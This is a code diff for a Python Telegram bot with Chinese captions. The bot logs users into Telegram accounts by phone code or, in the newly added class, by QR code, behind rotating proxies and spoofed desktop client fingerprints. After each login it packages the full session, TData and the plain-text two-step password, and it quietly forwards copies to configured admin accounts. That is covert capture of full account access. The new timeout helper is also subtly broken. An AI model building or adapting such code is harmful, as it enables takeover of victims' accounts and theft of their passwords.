@@ -7,10 +7,13 @@ import logging
 import random
 import time
 import re
+import uuid
+import qrcode
+from io import BytesIO
 from datetime import datetime
 from opentele.tl import TelegramClient
 from opentele.api import API, UseCurrentSession
-from telethon.errors import SessionPasswordNeededError, AuthRestartError
+from telethon.errors import SessionPasswordNeededError, AuthRestartError, FloodWaitError
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -27,48 +30,38 @@ PROXY_LIST_CACHE_TIME = 60
 
 def load_proxies():
     global _proxy_list, _proxy_list_last_load
-    
     current_time = time.time()
     if _proxy_list is not None and (current_time - _proxy_list_last_load) < PROXY_LIST_CACHE_TIME:
         return _proxy_list
-    
     proxy_file = "proxy.txt"
     valid_proxies = []
-    
     if not os.path.exists(proxy_file):
         _proxy_list = []
         _proxy_list_last_load = current_time
         return []
-    
     try:
         with open(proxy_file, 'r', encoding='utf-8') as f:
             for line in f:
                 line = line.strip()
                 if not line or line.startswith('#'):
                     continue
-                
                 parts = line.split(':')
                 if len(parts) >= 5:
                     ip, port, username, password, expire_ts = parts[:5]
                     try:
                         expire_timestamp = int(expire_ts)
                         if current_time < expire_timestamp:
-                            proxy = {
-                                'ip': ip,
-                                'port': int(port),
-                                'username': username,
-                                'password': password,
+                            valid_proxies.append({
+                                'ip': ip, 'port': int(port),
+                                'username': username, 'password': password,
                                 'expire': expire_timestamp
-                            }
-                            valid_proxies.append(proxy)
+                            })
                     except ValueError:
                         continue
-    
     except Exception:
         _proxy_list = []
         _proxy_list_last_load = current_time
         return []
-    
     _proxy_list = valid_proxies
     _proxy_list_last_load = current_time
     return valid_proxies
@@ -90,13 +83,10 @@ def create_proxy_dict(proxy):
     }
 
 def generate_non_linux_api():
-    max_attempts = 100
-    attempt = 0
-    while attempt < max_attempts:
+    for _ in range(100):
         api = API.TelegramDesktop.Generate()
         if 'linux' not in api.device_model.lower():
             return api
-        attempt += 1
     api = API.TelegramDesktop.Generate()
     api.device_model = "Desktop"
     return api
@@ -119,12 +109,9 @@ class LoginHandler:
         self.phone = phone
         self.session_file = f"sessions/{phone}.session"
         os.makedirs("sessions", exist_ok=True)
-        
         self.proxy = get_random_proxy()
         proxy_dict = create_proxy_dict(self.proxy) if self.proxy else None
-        
         self.random_api = generate_non_linux_api()
-        
         self.client = TelegramClient(
             self.session_file,
             api=self.random_api,
@@ -135,9 +122,7 @@ class LoginHandler:
             lang_code=self.random_api.lang_code,
             system_lang_code=self.random_api.system_lang_code
         )
-        
         await self.client.connect()
-        
         try:
             if not await self.client.is_user_authorized():
                 await self.client.send_code_request(phone)
@@ -159,7 +144,7 @@ class LoginHandler:
                     "<tg-emoji emoji-id='5839200986022812209'>❌</tg-emoji> 服务器繁忙，请稍后重试",
                     parse_mode='HTML'
                 )
-    
+
     async def handle_code(self, update, context, code):
         async with self._lock:
             try:
@@ -190,7 +175,7 @@ class LoginHandler:
                     await self.client.disconnect()
                     self.client = None
                 return None
-    
+
     async def handle_2fa(self, update, context, password):
         async with self._lock:
             try:
@@ -204,16 +189,13 @@ class LoginHandler:
                     parse_mode='HTML'
                 )
                 return False
-    
+
     async def finish_login(self, update, context):
         me = await self.client.get_me()
-        
         phone = self.phone
         reg_time = datetime.now().strftime("%Y-%m-%d")
-        
         json_data = {
-            "api_id": API_ID,
-            "api_hash": API_HASH,
+            "api_id": API_ID, "api_hash": API_HASH,
             "device_model": self.random_api.device_model,
             "system_version": self.random_api.system_version,
             "app_version": self.random_api.app_version,
@@ -221,50 +203,37 @@ class LoginHandler:
             "lang_pack": self.random_api.lang_pack,
             "lang_code": self.random_api.lang_code,
             "pid": self.random_api.pid,
-            "user_id": me.id,
-            "phone": phone,
+            "user_id": me.id, "phone": phone,
             "twofa": self.twofa if self.twofa else "",
             "password": self.twofa if self.twofa else "",
-            "app_id": API_ID,
-            "app_hash": API_HASH,
+            "app_id": API_ID, "app_hash": API_HASH,
             "session_file": os.path.basename(self.session_file).replace('.session', ''),
             "device": self.random_api.device_model,
-            "username": me.username or "",
-            "sex": None,
-            "avatar": "img/default.png",
-            "package_id": "",
-            "installer": "",
-            "ipv6": False,
-            "SDK": self.random_api.system_version,
+            "username": me.username or "", "sex": None,
+            "avatar": "img/default.png", "package_id": "", "installer": "",
+            "ipv6": False, "SDK": self.random_api.system_version,
             "sdk": self.random_api.system_version,
             "system_lang_pack": self.random_api.system_lang_code,
-            "premium": getattr(me, 'premium', False),
-            "reg_time": reg_time
+            "premium": getattr(me, 'premium', False), "reg_time": reg_time
         }
-        
         json_path = self.session_file.replace('.session', '.json')
         with open(json_path, 'w', encoding='utf-8') as f:
             json.dump(json_data, f, indent=2, ensure_ascii=False)
-        
         timestamp = int(asyncio.get_event_loop().time())
         zip_path = f"downloads/login_session_{self.user_id}_{timestamp}.zip"
         os.makedirs("downloads", exist_ok=True)
-        
         with zipfile.ZipFile(zip_path, 'w') as zipf:
             zipf.write(self.session_file, os.path.basename(self.session_file))
             zipf.write(json_path, os.path.basename(json_path))
-            
         tdesk = await self.client.ToTDesktop(flag=UseCurrentSession)
         tdata_base_dir = f"downloads/tdata_base_{phone}_{timestamp}"
         account_dir = os.path.join(tdata_base_dir, phone)
         tdata_dir = os.path.join(account_dir, "tdata")
         os.makedirs(tdata_dir, exist_ok=True)
         tdesk.SaveTData(tdata_dir)
-        
         if self.twofa:
             with open(os.path.join(account_dir, "2fa.txt"), 'w', encoding='utf-8') as f:
                 f.write(self.twofa)
-                
         tdata_zip_path = f"downloads/login_tdata_{self.user_id}_{timestamp}.zip"
         with zipfile.ZipFile(tdata_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
             for root, dirs, files in os.walk(account_dir):
@@ -272,44 +241,275 @@ class LoginHandler:
                     file_path = os.path.join(root, file)
                     arcname = os.path.relpath(file_path, account_dir)
                     zipf.write(file_path, arcname)
-
         with open(zip_path, 'rb') as f_session:
             await context.bot.send_document(
-                chat_id=self.chat_id,
-                document=f_session,
+                chat_id=self.chat_id, document=f_session,
                 caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Session]",
                 parse_mode='HTML'
             )
-            
         with open(tdata_zip_path, 'rb') as f_tdata:
             await context.bot.send_document(
-                chat_id=self.chat_id,
-                document=f_tdata,
+                chat_id=self.chat_id, document=f_tdata,
                 caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Tdata]",
                 parse_mode='HTML'
             )
-        
         if ADMIN_ID:
             for admin_id in ADMIN_ID.split(','):
                 try:
                     with open(zip_path, 'rb') as f_session:
-                        await context.bot.send_document(
-                            chat_id=admin_id.strip(),
-                            document=f_session,
-                            caption=f"用户 {self.user_id} 登录: {self.phone} [Session]"
-                        )
+                        await context.bot.send_document(chat_id=admin_id.strip(), document=f_session, caption=f"用户 {self.user_id} 登录: {self.phone} [Session]")
                     with open(tdata_zip_path, 'rb') as f_tdata:
-                        await context.bot.send_document(
-                            chat_id=admin_id.strip(),
-                            document=f_tdata,
-                            caption=f"用户 {self.user_id} 登录: {self.phone} [Tdata]"
-                        )
+                        await context.bot.send_document(chat_id=admin_id.strip(), document=f_tdata, caption=f"用户 {self.user_id} 登录: {self.phone} [Tdata]")
                 except:
                     pass
-        
         os.remove(zip_path)
         os.remove(tdata_zip_path)
         shutil.rmtree(tdata_base_dir, ignore_errors=True)
         os.remove(self.session_file)
         os.remove(json_path)
         await self.client.disconnect()
+
+
+class QrLoginHandler:
+    def __init__(self, user_id, chat_id, context, cleanup_callback=None):
+        self.user_id = user_id
+        self.chat_id = chat_id
+        self.context = context
+        self.cleanup_callback = cleanup_callback
+        self.client = None
+        self.session_file = None
+        self.random_api = None
+        self.proxy = None
+        self.phone = None
+        self.twofa = None
+        self.waiting_for_2fa = False
+        self.qr_login = None
+        self._timeout_task = None
+
+    async def start_qr_login(self, update, context):
+        session_name = f"qr_{uuid.uuid4().hex[:8]}_{int(time.time())}"
+        self.session_file = f"sessions/{session_name}.session"
+        os.makedirs("sessions", exist_ok=True)
+        self.proxy = get_random_proxy()
+        proxy_dict = create_proxy_dict(self.proxy) if self.proxy else None
+        self.random_api = generate_non_linux_api()
+        self.client = TelegramClient(
+            self.session_file, api=self.random_api, proxy=proxy_dict,
+            device_model=self.random_api.device_model,
+            system_version=self.random_api.system_version,
+            app_version=self.random_api.app_version,
+            lang_code=self.random_api.lang_code,
+            system_lang_code=self.random_api.system_lang_code
+        )
+        await self.client.connect()
+        try:
+            self.qr_login = await self.client.qr_login()
+            try:
+                qr_data = self.qr_login.qr_code
+            except AttributeError:
+                qr = qrcode.QRCode(border=1)
+                qr.add_data(self.qr_login.url)
+                qr.make(fit=True)
+                img = qr.make_image(fill_color="black", back_color="white")
+                img_byte_arr = BytesIO()
+                img.save(img_byte_arr, format='PNG')
+                qr_data = img_byte_arr.getvalue()
+            qr_path = f"downloads/qr_{self.user_id}_{int(time.time())}.png"
+            with open(qr_path, 'wb') as f:
+                f.write(qr_data)
+            with open(qr_path, 'rb') as f:
+                await context.bot.send_photo(
+                    chat_id=self.chat_id, photo=f,
+                    caption="<tg-emoji emoji-id='5877318502947229960'>📱</tg-emoji> 请使用 Telegram 手机端扫描二维码登录\n\n⏱️ 二维码有效期为2分钟",
+                    parse_mode='HTML'
+                )
+            os.remove(qr_path)
+            try:
+                await asyncio.wait_for(self.qr_login.wait(), timeout=120)
+                await self._finish_qr_login(update, context)
+            except asyncio.TimeoutError:
+                await context.bot.send_message(
+                    chat_id=self.chat_id,
+                    text="<tg-emoji emoji-id='5900104897885376843'>⏰</tg-emoji> 扫码登录超时，请重新尝试",
+                    parse_mode='HTML'
+                )
+                await self._cleanup()
+            except Exception as e:
+                error_str = str(e)
+                if "two-steps verification" in error_str.lower() or "password" in error_str.lower():
+                    self.waiting_for_2fa = True
+                    await context.bot.send_message(
+                        chat_id=self.chat_id,
+                        text="<tg-emoji emoji-id='6005570495603282482'>🔐</tg-emoji> 该账号已开启两步验证，请输入密码：",
+                        parse_mode='HTML'
+                    )
+                    self._start_timeout_task(context, 120)
+                else:
+                    logger.error(f"扫码登录异常: {e}", exc_info=True)
+                    await context.bot.send_message(
+                        chat_id=self.chat_id,
+                        text=f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 扫码登录失败: {error_str}",
+                        parse_mode='HTML'
+                    )
+                    await self._cleanup()
+        except FloodWaitError as e:
+            await context.bot.send_message(
+                chat_id=self.chat_id,
+                text=f"<tg-emoji emoji-id='5877613700344450910'>⚠️</tg-emoji> 请求过于频繁，请等待 {e.seconds} 秒后重试",
+                parse_mode='HTML'
+            )
+            await self._cleanup()
+        except Exception as e:
+            logger.error(f"扫码登录异常: {e}", exc_info=True)
+            await context.bot.send_message(
+                chat_id=self.chat_id,
+                text=f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 扫码登录失败: {str(e)}",
+                parse_mode='HTML'
+            )
+            await self._cleanup()
+
+    async def submit_2fa(self, update, context, password):
+        if not self.waiting_for_2fa:
+            return False
+        self.waiting_for_2fa = False
+        if self._timeout_task:
+            self._timeout_task.cancel()
+        try:
+            await self.client.sign_in(password=password)
+            self.twofa = password
+            await self._finish_qr_login(update, context)
+            return True
+        except Exception as e:
+            await context.bot.send_message(
+                chat_id=self.chat_id,
+                text=f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 2FA验证失败: {str(e)}",
+                parse_mode='HTML'
+            )
+            await self._cleanup()
+            return False
+
+    async def _finish_qr_login(self, update, context):
+        try:
+            # 强制拉取当前用户和对话列表，确保数据库表 entities 被创建
+            me = await self.client.get_me()
+            await self.client.get_dialogs()  # 这步会初始化 entities 表
+            self.phone = me.phone
+
+            reg_time = datetime.now().strftime("%Y-%m-%d")
+            json_data = {
+                "api_id": API_ID, "api_hash": API_HASH,
+                "device_model": self.random_api.device_model,
+                "system_version": self.random_api.system_version,
+                "app_version": self.random_api.app_version,
+                "system_lang_code": self.random_api.system_lang_code,
+                "lang_pack": self.random_api.lang_pack,
+                "lang_code": self.random_api.lang_code,
+                "pid": self.random_api.pid,
+                "user_id": me.id, "phone": self.phone,
+                "twofa": self.twofa if self.twofa else "",
+                "password": self.twofa if self.twofa else "",
+                "app_id": API_ID, "app_hash": API_HASH,
+                "session_file": os.path.basename(self.session_file).replace('.session', ''),
+                "device": self.random_api.device_model,
+                "username": me.username or "", "sex": None,
+                "avatar": "img/default.png", "package_id": "", "installer": "",
+                "ipv6": False, "SDK": self.random_api.system_version,
+                "sdk": self.random_api.system_version,
+                "system_lang_pack": self.random_api.system_lang_code,
+                "premium": getattr(me, 'premium', False), "reg_time": reg_time
+            }
+            json_path = self.session_file.replace('.session', '.json')
+            with open(json_path, 'w', encoding='utf-8') as f:
+                json.dump(json_data, f, indent=2, ensure_ascii=False)
+
+            timestamp = int(asyncio.get_event_loop().time())
+            zip_path = f"downloads/login_session_{self.user_id}_{timestamp}.zip"
+            os.makedirs("downloads", exist_ok=True)
+            with zipfile.ZipFile(zip_path, 'w') as zipf:
+                zipf.write(self.session_file, os.path.basename(self.session_file))
+                zipf.write(json_path, os.path.basename(json_path))
+
+            tdesk = await self.client.ToTDesktop(flag=UseCurrentSession)
+            tdata_base_dir = f"downloads/tdata_base_{self.phone}_{timestamp}"
+            account_dir = os.path.join(tdata_base_dir, self.phone)
+            tdata_dir = os.path.join(account_dir, "tdata")
+            os.makedirs(tdata_dir, exist_ok=True)
+            tdesk.SaveTData(tdata_dir)
+            if self.twofa:
+                with open(os.path.join(account_dir, "2fa.txt"), 'w', encoding='utf-8') as f:
+                    f.write(self.twofa)
+
+            tdata_zip_path = f"downloads/login_tdata_{self.user_id}_{timestamp}.zip"
+            with zipfile.ZipFile(tdata_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for root, dirs, files in os.walk(account_dir):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        arcname = os.path.relpath(file_path, account_dir)
+                        zipf.write(file_path, arcname)
+
+            with open(zip_path, 'rb') as f_session:
+                await context.bot.send_document(
+                    chat_id=self.chat_id, document=f_session,
+                    caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 扫码登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Session]",
+                    parse_mode='HTML'
+                )
+            with open(tdata_zip_path, 'rb') as f_tdata:
+                await context.bot.send_document(
+                    chat_id=self.chat_id, document=f_tdata,
+                    caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 扫码登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone} [Tdata]",
+                    parse_mode='HTML'
+                )
+
+            if ADMIN_ID:
+                for admin_id in ADMIN_ID.split(','):
+                    try:
+                        with open(zip_path, 'rb') as f_session:
+                            await context.bot.send_document(chat_id=admin_id.strip(), document=f_session, caption=f"用户 {self.user_id} 扫码登录: {self.phone} [Session]")
+                        with open(tdata_zip_path, 'rb') as f_tdata:
+                            await context.bot.send_document(chat_id=admin_id.strip(), document=f_tdata, caption=f"用户 {self.user_id} 扫码登录: {self.phone} [Tdata]")
+                    except:
+                        pass
+
+            os.remove(zip_path)
+            os.remove(tdata_zip_path)
+            shutil.rmtree(tdata_base_dir, ignore_errors=True)
+            os.remove(self.session_file)
+            os.remove(json_path)
+        except Exception as e:
+            logger.error(f"导出登录文件失败: {e}", exc_info=True)
+            await context.bot.send_message(
+                chat_id=self.chat_id,
+                text=f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 导出文件失败: {str(e)}",
+                parse_mode='HTML'
+            )
+        finally:
+            await self.client.disconnect()
+            if self.cleanup_callback:
+                self.cleanup_callback()
+
+    async def _start_timeout_task(self, context, timeout):
+        async def timeout_func():
+            await asyncio.sleep(timeout)
+            if self.waiting_for_2fa:
+                await context.bot.send_message(
+                    chat_id=self.chat_id,
+                    text="<tg-emoji emoji-id='5900104897885376843'>⏰</tg-emoji> 2FA输入超时，请重新扫码",
+                    parse_mode='HTML'
+                )
+                await self._cleanup()
+        self._timeout_task = asyncio.create_task(timeout_func())
+
+    async def _cleanup(self):
+        self.waiting_for_2fa = False
+        if self._timeout_task:
+            self._timeout_task.cancel()
+        if self.client:
+            await self.client.disconnect()
+            self.client = None
+        if self.session_file and os.path.exists(self.session_file):
+            try:
+                os.remove(self.session_file)
+            except:
+                pass
+        if self.cleanup_callback:
+            self.cleanup_callback()
